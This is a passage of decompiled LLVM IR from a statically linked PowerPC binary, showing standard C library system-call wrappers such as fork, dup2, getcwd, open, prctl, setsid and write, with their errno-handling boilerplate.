  uselistorder label %dec_label_pc_1000ab0c, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000ab3c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000ab3c, i32* %stack_var_-32, align 4
  %v0_1000ab58 = call i32 @__asm_mfcr()
  %v1_1000ab5c = and i32 %v0_1000ab58, 268435456
  %v3_1000ab5c = icmp eq i32 %v1_1000ab5c, 0
  store i32 %v0_1000ab58, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ab5c, label %dec_label_pc_1000ab74, label %dec_label_pc_1000ab68

dec_label_pc_1000ab68:                            ; preds = %entry
  %v0_1000ab68 = call i32 @__errno_location()
  %v0_1000ab6c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ab6c = inttoptr i32 %v0_1000ab68 to i32*
  store i32 %v0_1000ab6c, i32* %v2_1000ab6c, align 4
  br label %dec_label_pc_1000ab74

dec_label_pc_1000ab74:                            ; preds = %entry, %dec_label_pc_1000ab68
  %v0_1000ab84 = phi i32 [ %v0_1000ab58, %entry ], [ -1, %dec_label_pc_1000ab68 ]
  ret i32 %v0_1000ab84

; uselistorder directives
  uselistorder label %dec_label_pc_1000ab74, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000ab9c

dec_label_pc_1000ab9c:                            ; preds = %dec_label_pc_1000ab9c.backedge, %entry
  %v0_1000aba8 = call i32 @__asm_mfcr()
  %v1_1000abac = and i32 %v0_1000aba8, 268435456
  %v3_1000abac = icmp eq i32 %v1_1000abac, 0
  store i32 %v0_1000aba8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000abac, label %dec_label_pc_1000ab9c.backedge, label %dec_label_pc_1000abb8

dec_label_pc_1000abb8:                            ; preds = %dec_label_pc_1000ab9c
  %v0_1000abb8 = call i32 @__errno_location()
  %v0_1000abbc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000abbc = inttoptr i32 %v0_1000abb8 to i32*
  store i32 %v0_1000abbc, i32* %v2_1000abbc, align 4
  br label %dec_label_pc_1000ab9c.backedge

dec_label_pc_1000ab9c.backedge:                   ; preds = %dec_label_pc_1000abb8, %dec_label_pc_1000ab9c
  br label %dec_label_pc_1000ab9c
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000abdc = call i32 @__asm_mfcr()
  %v1_1000abe0 = and i32 %v0_1000abdc, 268435456
  %v3_1000abe0 = icmp eq i32 %v1_1000abe0, 0
  store i32 %v0_1000abdc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000abe0, label %dec_label_pc_1000abf8, label %dec_label_pc_1000abec

dec_label_pc_1000abec:                            ; preds = %entry
  %v0_1000abec = call i32 @__errno_location()
  %v0_1000abf0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000abf0 = inttoptr i32 %v0_1000abec to i32*
  store i32 %v0_1000abf0, i32* %v2_1000abf0, align 4
  br label %dec_label_pc_1000abf8

dec_label_pc_1000abf8:                            ; preds = %entry, %dec_label_pc_1000abec
  %v0_1000ac08 = phi i32 [ %v0_1000abdc, %entry ], [ -1, %dec_label_pc_1000abec ]
  ret i32 %v0_1000ac08

; uselistorder directives
  uselistorder label %dec_label_pc_1000abf8, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ac24 = call i32 @__asm_mfcr()
  %v1_1000ac28 = and i32 %v0_1000ac24, 268435456
  %v3_1000ac28 = icmp eq i32 %v1_1000ac28, 0
  store i32 %v0_1000ac24, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ac28, label %dec_label_pc_1000ac40, label %dec_label_pc_1000ac34

dec_label_pc_1000ac34:                            ; preds = %entry
  %v0_1000ac34 = call i32 @__errno_location()
  %v0_1000ac38 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ac38 = inttoptr i32 %v0_1000ac34 to i32*
  store i32 %v0_1000ac38, i32* %v2_1000ac38, align 4
  br label %dec_label_pc_1000ac40

dec_label_pc_1000ac40:                            ; preds = %entry, %dec_label_pc_1000ac34
  %v0_1000ac50 = phi i32 [ %v0_1000ac24, %entry ], [ -1, %dec_label_pc_1000ac34 ]
  ret i32 %v0_1000ac50

; uselistorder directives
  uselistorder label %dec_label_pc_1000ac40, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ac6c = call i32 @__asm_mfcr()
  %v1_1000ac70 = and i32 %v0_1000ac6c, 268435456
  %v3_1000ac70 = icmp eq i32 %v1_1000ac70, 0
  store i32 %v0_1000ac6c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ac70, label %dec_label_pc_1000ac88, label %dec_label_pc_1000ac7c

dec_label_pc_1000ac7c:                            ; preds = %entry
  %v0_1000ac7c = call i32 @__errno_location()
  %v0_1000ac80 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ac80 = inttoptr i32 %v0_1000ac7c to i32*
  store i32 %v0_1000ac80, i32* %v2_1000ac80, align 4
  br label %dec_label_pc_1000ac88

dec_label_pc_1000ac88:                            ; preds = %entry, %dec_label_pc_1000ac7c
  %v0_1000ac98 = phi i32 [ %v0_1000ac6c, %entry ], [ -1, %dec_label_pc_1000ac7c ]
  ret i32 %v0_1000ac98

; uselistorder directives
  uselistorder label %dec_label_pc_1000ac88, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000acb4 = call i32 @__asm_mfcr()
  %v1_1000acb8 = and i32 %v0_1000acb4, 268435456
  %v3_1000acb8 = icmp eq i32 %v1_1000acb8, 0
  store i32 %v0_1000acb4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000acb8, label %dec_label_pc_1000acd0, label %dec_label_pc_1000acc4

dec_label_pc_1000acc4:                            ; preds = %entry
  %v0_1000acc4 = call i32 @__errno_location()
  %v0_1000acc8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000acc8 = inttoptr i32 %v0_1000acc4 to i32*
  store i32 %v0_1000acc8, i32* %v2_1000acc8, align 4
  br label %dec_label_pc_1000acd0

dec_label_pc_1000acd0:                            ; preds = %entry, %dec_label_pc_1000acc4
  %v0_1000ace0 = phi i32 [ %v0_1000acb4, %entry ], [ -1, %dec_label_pc_1000acc4 ]
  ret i32 %v0_1000ace0

; uselistorder directives
  uselistorder label %dec_label_pc_1000acd0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_1000acf0 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_1000ad00 = icmp eq i32 %arg1, 0
  br i1 %v3_1000acf0, label %dec_label_pc_1000ad00, label %dec_label_pc_1000ad34

dec_label_pc_1000ad00:                            ; preds = %entry
  br i1 %v3_1000ad00, label %dec_label_pc_1000ad1c, label %dec_label_pc_1000ad08

dec_label_pc_1000ad08:                            ; preds = %dec_label_pc_1000ad00
  %v0_1000ad08 = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_1000ad14 = inttoptr i32 %v0_1000ad08 to i32*
  store i32 22, i32* %v2_1000ad14, align 4
  br label %dec_label_pc_1000adcc

dec_label_pc_1000ad1c:                            ; preds = %dec_label_pc_1000ad00
  store i32 268479776, i32* @lr, align 4
  %v0_1000ad1c = call i32 @__GI_getpagesize()
  %v1_1000ad20 = icmp slt i32 %v0_1000ad1c, 4096
  %v0_1000ad24. = select i1 %v1_1000ad20, i32 4096, i32 %v0_1000ad1c
  store i32 %v0_1000ad24., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ad44

dec_label_pc_1000ad34:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_1000ad00, label %dec_label_pc_1000ad44, label %dec_label_pc_1000ad54

dec_label_pc_1000ad44:                            ; preds = %dec_label_pc_1000ad1c, %dec_label_pc_1000ad34
  %v0_1000ad44 = phi i32 [ %v0_1000ad24., %dec_label_pc_1000ad1c ], [ %arg2, %dec_label_pc_1000ad34 ]
  store i32 %v0_1000ad44, i32* @r3, align 4
  store i32 268479820, i32* @lr, align 4
  %v0_1000ad48 = call i32 @malloc()
  store i32 %v0_1000ad48, i32* @r29, align 4
  %v3_1000ad4c = icmp eq i32 %v0_1000ad48, 0
  br i1 %v3_1000ad4c, label %dec_label_pc_1000adc8, label %dec_label_pc_1000ad44.dec_label_pc_1000ad54_crit_edge

dec_label_pc_1000ad44.dec_label_pc_1000ad54_crit_edge: ; preds = %dec_label_pc_1000ad44
  br label %dec_label_pc_1000ad54

dec_label_pc_1000ad54:                            ; preds = %dec_label_pc_1000ad44.dec_label_pc_1000ad54_crit_edge, %dec_label_pc_1000ad34
  %v0_1000ad64 = call i32 @__asm_mfcr()
  %v1_1000ad68 = and i32 %v0_1000ad64, 268435456
  %v3_1000ad68 = icmp eq i32 %v1_1000ad68, 0
  store i32 %v0_1000ad64, i32* %r31.global-to-local, align 4
  store i32 %v0_1000ad64, i32* @r4, align 4
  br i1 %v3_1000ad68, label %dec_label_pc_1000ad84, label %dec_label_pc_1000ad78

dec_label_pc_1000ad78:                            ; preds = %dec_label_pc_1000ad54
  %v0_1000ad78 = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_1000ad80 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ad80 = inttoptr i32 %v0_1000ad78 to i32*
  store i32 %v0_1000ad80, i32* %v2_1000ad80, align 4
  %v0_1000ad84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000ad84

dec_label_pc_1000ad84:                            ; preds = %dec_label_pc_1000ad54, %dec_label_pc_1000ad78
  %v0_1000ad84 = phi i32 [ %v0_1000ad64, %dec_label_pc_1000ad54 ], [ %v0_1000ad84.pre, %dec_label_pc_1000ad78 ]
  %v1_1000ad84 = icmp slt i32 %v0_1000ad84, 0
  %v0_1000ad88 = load i32, i32* @r30, align 4
  %v3_1000ad88 = icmp eq i32 %v0_1000ad88, 0
  br i1 %v1_1000ad84, label %dec_label_pc_1000adb8, label %dec_label_pc_1000ad90

dec_label_pc_1000ad90:                            ; preds = %dec_label_pc_1000ad84
  br i1 %v3_1000ad88, label %dec_label_pc_1000ad94, label %dec_label_pc_1000ada8.thread8

dec_label_pc_1000ada8.thread8:                    ; preds = %dec_label_pc_1000ad90
  br label %dec_label_pc_1000adcc

dec_label_pc_1000ad94:                            ; preds = %dec_label_pc_1000ad90
  %v0_1000ad94 = load i32, i32* @r28, align 4
  %v3_1000ad94 = icmp eq i32 %v0_1000ad94, 0
  br i1 %v3_1000ad94, label %dec_label_pc_1000ada8, label %dec_label_pc_1000ada8.thread

dec_label_pc_1000ada8.thread:                     ; preds = %dec_label_pc_1000ad94
  br label %dec_label_pc_1000adb0

dec_label_pc_1000ada8:                            ; preds = %dec_label_pc_1000ad94
  %v0_1000ad9c = load i32, i32* @r29, align 4
  store i32 268479908, i32* @lr, align 4
  %v1_1000ada0 = call i32 @realloc(i32 %v0_1000ad9c)
  store i32 %v1_1000ada0, i32* @r30, align 4
  %v3_1000ada8 = icmp eq i32 %v1_1000ada0, 0
  br i1 %v3_1000ada8, label %dec_label_pc_1000adb0, label %dec_label_pc_1000adcc

dec_label_pc_1000adb0:                            ; preds = %dec_label_pc_1000ada8.thread, %dec_label_pc_1000ada8
  %v0_1000adb0 = load i32, i32* @r29, align 4
  store i32 %v0_1000adb0, i32* @r30, align 4
  br label %dec_label_pc_1000adcc

dec_label_pc_1000adb8:                            ; preds = %dec_label_pc_1000ad84
  br i1 %v3_1000ad88, label %dec_label_pc_1000adbc, label %dec_label_pc_1000adc8

dec_label_pc_1000adbc:                            ; preds = %dec_label_pc_1000adb8
  %v0_1000adbc = load i32, i32* @r29, align 4
  store i32 %v0_1000adbc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000adc4.823 to i32), i32* @lr, align 4
  %v0_1000adc0 = call i32 @free()
  br label %dec_label_pc_1000adcc

dec_label_pc_1000adc8:                            ; preds = %dec_label_pc_1000adb8, %dec_label_pc_1000ad44
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_1000adcc

dec_label_pc_1000adcc:                            ; preds = %dec_label_pc_1000ada8.thread8, %dec_label_pc_1000ada8, %dec_label_pc_1000adbc, %dec_label_pc_1000adb0, %dec_label_pc_1000ad08, %dec_label_pc_1000adc8
  %v0_1000add0 = load i32, i32* @r30, align 4
  ret i32 %v0_1000add0

; uselistorder directives
  uselistorder i32 %v0_1000ad64, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000adcc, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_1000adb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad84, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad44, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000adf0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479996, i32* @lr, align 4
  %v2_1000adf8 = call i32 @getrlimit(i32 7, i32 %v2_1000adf0)
  %v1_1000adfc = icmp slt i32 %v2_1000adf8, 0
  br i1 %v1_1000adfc, label %dec_label_pc_1000ae0c, label %dec_label_pc_1000ae08

dec_label_pc_1000ae08:                            ; preds = %entry
  %v3_1000ae08 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ae0c

dec_label_pc_1000ae0c:                            ; preds = %entry, %dec_label_pc_1000ae08
  %v0_1000ae18 = phi i32 [ 256, %entry ], [ %v3_1000ae08, %dec_label_pc_1000ae08 ]
  ret i32 %v0_1000ae18

; uselistorder directives
  uselistorder label %dec_label_pc_1000ae0c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_1000ae24 = load i32, i32* @global_var_1002e638.824, align 4
  %v3_1000ae28 = icmp eq i32 %v3_1000ae24, 0
  %v0_1000ae2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ae28, i32 %v0_1000ae2c)
  ret i32 %v3_1000ae24
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ae50 = call i32 @__asm_mfcr()
  %v1_1000ae54 = and i32 %v0_1000ae50, 268435456
  %v3_1000ae54 = icmp eq i32 %v1_1000ae54, 0
  store i32 %v0_1000ae50, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ae54, label %dec_label_pc_1000ae6c, label %dec_label_pc_1000ae60

dec_label_pc_1000ae60:                            ; preds = %entry
  %v0_1000ae60 = call i32 @__errno_location()
  %v0_1000ae64 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ae64 = inttoptr i32 %v0_1000ae60 to i32*
  store i32 %v0_1000ae64, i32* %v2_1000ae64, align 4
  br label %dec_label_pc_1000ae6c

dec_label_pc_1000ae6c:                            ; preds = %entry, %dec_label_pc_1000ae60
  %v0_1000ae7c = phi i32 [ %v0_1000ae50, %entry ], [ -1, %dec_label_pc_1000ae60 ]
  ret i32 %v0_1000ae7c

; uselistorder directives
  uselistorder label %dec_label_pc_1000ae6c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ae98 = call i32 @__asm_mfcr()
  %v1_1000ae9c = and i32 %v0_1000ae98, 268435456
  %v3_1000ae9c = icmp eq i32 %v1_1000ae9c, 0
  store i32 %v0_1000ae98, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ae9c, label %dec_label_pc_1000aeb4, label %dec_label_pc_1000aea8

dec_label_pc_1000aea8:                            ; preds = %entry
  %v0_1000aea8 = call i32 @__errno_location()
  %v0_1000aeac = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aeac = inttoptr i32 %v0_1000aea8 to i32*
  store i32 %v0_1000aeac, i32* %v2_1000aeac, align 4
  br label %dec_label_pc_1000aeb4

dec_label_pc_1000aeb4:                            ; preds = %entry, %dec_label_pc_1000aea8
  %v0_1000aec4 = phi i32 [ %v0_1000ae98, %entry ], [ -1, %dec_label_pc_1000aea8 ]
  ret i32 %v0_1000aec4

; uselistorder directives
  uselistorder label %dec_label_pc_1000aeb4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000aee0 = call i32 @__asm_mfcr()
  %v1_1000aee4 = and i32 %v0_1000aee0, 268435456
  %v3_1000aee4 = icmp eq i32 %v1_1000aee4, 0
  store i32 %v0_1000aee0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000aee4, label %dec_label_pc_1000aefc, label %dec_label_pc_1000aef0

dec_label_pc_1000aef0:                            ; preds = %entry
  %v0_1000aef0 = call i32 @__errno_location()
  %v0_1000aef4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aef4 = inttoptr i32 %v0_1000aef0 to i32*
  store i32 %v0_1000aef4, i32* %v2_1000aef4, align 4
  br label %dec_label_pc_1000aefc

dec_label_pc_1000aefc:                            ; preds = %entry, %dec_label_pc_1000aef0
  %v0_1000af0c = phi i32 [ %v0_1000aee0, %entry ], [ -1, %dec_label_pc_1000aef0 ]
  ret i32 %v0_1000af0c

; uselistorder directives
  uselistorder label %dec_label_pc_1000aefc, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000af24 = and i32 %arg2, 64
  %v3_1000af24 = icmp eq i32 %v1_1000af24, 0
  br i1 %v3_1000af24, label %dec_label_pc_1000af50, label %dec_label_pc_1000af34

dec_label_pc_1000af34:                            ; preds = %entry
  %v2_1000af3c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000af3c, i32* %stack_var_-32, align 4
  %v0_1000af4c = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000af50

dec_label_pc_1000af50:                            ; preds = %entry, %dec_label_pc_1000af34
  %v0_1000af50 = phi i32 [ 0, %entry ], [ %v0_1000af4c, %dec_label_pc_1000af34 ]
  store i32 %v0_1000af50, i32* @r5, align 4
  %v0_1000af58 = call i32 @__asm_mfcr()
  %v1_1000af5c = and i32 %v0_1000af58, 268435456
  %v3_1000af5c = icmp eq i32 %v1_1000af5c, 0
  store i32 %v0_1000af58, i32* %r31.global-to-local, align 4
  br i1 %v3_1000af5c, label %dec_label_pc_1000af74, label %dec_label_pc_1000af68

dec_label_pc_1000af68:                            ; preds = %dec_label_pc_1000af50
  %v0_1000af68 = call i32 @__errno_location()
  %v0_1000af6c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000af6c = inttoptr i32 %v0_1000af68 to i32*
  store i32 %v0_1000af6c, i32* %v2_1000af6c, align 4
  br label %dec_label_pc_1000af74

dec_label_pc_1000af74:                            ; preds = %dec_label_pc_1000af50, %dec_label_pc_1000af68
  %v0_1000af84 = phi i32 [ %v0_1000af58, %dec_label_pc_1000af50 ], [ -1, %dec_label_pc_1000af68 ]
  ret i32 %v0_1000af84

; uselistorder directives
  uselistorder label %dec_label_pc_1000af74, { 1, 0 }
  uselistorder label %dec_label_pc_1000af50, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000af94 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_1000af94
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000afb0 = call i32 @__asm_mfcr()
  %v1_1000afb4 = and i32 %v0_1000afb0, 268435456
  %v3_1000afb4 = icmp eq i32 %v1_1000afb4, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000afb0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000afb4, label %dec_label_pc_1000afcc, label %dec_label_pc_1000afc0

dec_label_pc_1000afc0:                            ; preds = %entry
  %v0_1000afc0 = call i32 @__errno_location()
  %v0_1000afc4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000afc4 = inttoptr i32 %v0_1000afc0 to i32*
  store i32 %v0_1000afc4, i32* %v2_1000afc4, align 4
  br label %dec_label_pc_1000afcc

dec_label_pc_1000afcc:                            ; preds = %entry, %dec_label_pc_1000afc0
  %v0_1000afdc = phi i32 [ %v0_1000afb0, %entry ], [ -1, %dec_label_pc_1000afc0 ]
  ret i32 %v0_1000afdc

; uselistorder directives
  uselistorder label %dec_label_pc_1000afcc, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000aff8 = call i32 @__asm_mfcr()
  %v1_1000affc = and i32 %v0_1000aff8, 268435456
  %v3_1000affc = icmp eq i32 %v1_1000affc, 0
  store i32 %v0_1000aff8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000affc, label %dec_label_pc_1000b014, label %dec_label_pc_1000b008

dec_label_pc_1000b008:                            ; preds = %entry
  %v0_1000b008 = call i32 @__errno_location()
  %v0_1000b00c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b00c = inttoptr i32 %v0_1000b008 to i32*
  store i32 %v0_1000b00c, i32* %v2_1000b00c, align 4
  br label %dec_label_pc_1000b014

dec_label_pc_1000b014:                            ; preds = %entry, %dec_label_pc_1000b008
  %v0_1000b024 = phi i32 [ %v0_1000aff8, %entry ], [ -1, %dec_label_pc_1000b008 ]
  ret i32 %v0_1000b024

; uselistorder directives
  uselistorder label %dec_label_pc_1000b014, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b040 = call i32 @__asm_mfcr()
  %v1_1000b044 = and i32 %v0_1000b040, 268435456
  %v3_1000b044 = icmp eq i32 %v1_1000b044, 0
  store i32 %v0_1000b040, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b044, label %dec_label_pc_1000b05c, label %dec_label_pc_1000b050

dec_label_pc_1000b050:                            ; preds = %entry
  %v0_1000b050 = call i32 @__errno_location()
  %v0_1000b054 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b054 = inttoptr i32 %v0_1000b050 to i32*
  store i32 %v0_1000b054, i32* %v2_1000b054, align 4
  br label %dec_label_pc_1000b05c

dec_label_pc_1000b05c:                            ; preds = %entry, %dec_label_pc_1000b050
  %v0_1000b06c = phi i32 [ %v0_1000b040, %entry ], [ -1, %dec_label_pc_1000b050 ]
  ret i32 %v0_1000b06c

; uselistorder directives
  uselistorder label %dec_label_pc_1000b05c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b088 = call i32 @__asm_mfcr()
  %v1_1000b08c = and i32 %v0_1000b088, 268435456
  %v3_1000b08c = icmp eq i32 %v1_1000b08c, 0
  store i32 %v0_1000b088, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b08c, label %dec_label_pc_1000b0a4, label %dec_label_pc_1000b098

dec_label_pc_1000b098:                            ; preds = %entry
  %v0_1000b098 = call i32 @__errno_location()
  %v0_1000b09c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b09c = inttoptr i32 %v0_1000b098 to i32*
  store i32 %v0_1000b09c, i32* %v2_1000b09c, align 4
  br label %dec_label_pc_1000b0a4

dec_label_pc_1000b0a4:                            ; preds = %entry, %dec_label_pc_1000b098
  %v0_1000b0b4 = phi i32 [ %v0_1000b088, %entry ], [ -1, %dec_label_pc_1000b098 ]
  ret i32 %v0_1000b0b4

; uselistorder directives
  uselistorder label %dec_label_pc_1000b0a4, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b0d0 = call i32 @__asm_mfcr()
  %v1_1000b0d4 = and i32 %v0_1000b0d0, 268435456
  %v3_1000b0d4 = icmp eq i32 %v1_1000b0d4, 0
  store i32 %v0_1000b0d0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b0d4, label %dec_label_pc_1000b0ec, label %dec_label_pc_1000b0e0

dec_label_pc_1000b0e0:                            ; preds = %entry
  %v0_1000b0e0 = call i32 @__errno_location()
  %v0_1000b0e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b0e4 = inttoptr i32 %v0_1000b0e0 to i32*
  store i32 %v0_1000b0e4, i32* %v2_1000b0e4, align 4
  br label %dec_label_pc_1000b0ec

dec_label_pc_1000b0ec:                            ; preds = %entry, %dec_label_pc_1000b0e0
  %v0_1000b0fc = phi i32 [ %v0_1000b0d0, %entry ], [ -1, %dec_label_pc_1000b0e0 ]
  ret i32 %v0_1000b0fc

; uselistorder directives
  uselistorder label %dec_label_pc_1000b0ec, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000b100 = icmp eq i32 %arg2, 0
  br i1 %v3_1000b100, label %dec_label_pc_1000b140, label %dec_label_pc_1000b128

dec_label_pc_1000b128:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000b140, label %dec_label_pc_1000b130

dec_label_pc_1000b130:                            ; preds = %dec_label_pc_1000b128
  %v0_1000b130 = call i32 @__errno_location()
  %v2_1000b138 = inttoptr i32 %v0_1000b130 to i32*
  store i32 22, i32* %v2_1000b138, align 4
  %v0_1000b164.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b160

dec_label_pc_1000b140:                            ; preds = %dec_label_pc_1000b128, %entry
  %v0_1000b144 = call i32 @__asm_mfcr()
  %v1_1000b148 = and i32 %v0_1000b144, 268435456
  %v3_1000b148 = icmp eq i32 %v1_1000b148, 0
  store i32 %v0_1000b144, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b148, label %dec_label_pc_1000b160, label %dec_label_pc_1000b154

dec_label_pc_1000b154:                            ; preds = %dec_label_pc_1000b140
  %v0_1000b154 = call i32 @__errno_location()
  %v0_1000b158 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b158 = inttoptr i32 %v0_1000b154 to i32*
  store i32 %v0_1000b158, i32* %v2_1000b158, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b160

dec_label_pc_1000b160:                            ; preds = %dec_label_pc_1000b140, %dec_label_pc_1000b130, %dec_label_pc_1000b154
  %v0_1000b164 = phi i32 [ %v0_1000b144, %dec_label_pc_1000b140 ], [ %v0_1000b164.pre, %dec_label_pc_1000b130 ], [ -1, %dec_label_pc_1000b154 ]
  ret i32 %v0_1000b164

; uselistorder directives
  uselistorder label %dec_label_pc_1000b160, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b190 = call i32 @__asm_mfcr()
  %v1_1000b194 = and i32 %v0_1000b190, 268435456
  %v3_1000b194 = icmp eq i32 %v1_1000b194, 0
  store i32 %v0_1000b190, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b194, label %dec_label_pc_1000b1ac, label %dec_label_pc_1000b1a0

dec_label_pc_1000b1a0:                            ; preds = %entry
  %v0_1000b1a0 = call i32 @__errno_location()
  %v0_1000b1a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b1a4 = inttoptr i32 %v0_1000b1a0 to i32*
  store i32 %v0_1000b1a4, i32* %v2_1000b1a4, align 4
  br label %dec_label_pc_1000b1ac

dec_label_pc_1000b1ac:                            ; preds = %entry, %dec_label_pc_1000b1a0
  %v0_1000b1bc = phi i32 [ %v0_1000b190, %entry ], [ -1, %dec_label_pc_1000b1a0 ]
  ret i32 %v0_1000b1bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000b1ac, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000b1c4 = call i32 @wait4(i32 0)
  ret i32 %v1_1000b1c4
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b1e0 = call i32 @__asm_mfcr()
  %v1_1000b1e4 = and i32 %v0_1000b1e0, 268435456
  %v3_1000b1e4 = icmp eq i32 %v1_1000b1e4, 0
  store i32 %v0_1000b1e0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b1e4, label %dec_label_pc_1000b1fc, label %dec_label_pc_1000b1f0

dec_label_pc_1000b1f0:                            ; preds = %entry
  %v0_1000b1f0 = call i32 @__errno_location()
  %v0_1000b1f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b1f4 = inttoptr i32 %v0_1000b1f0 to i32*
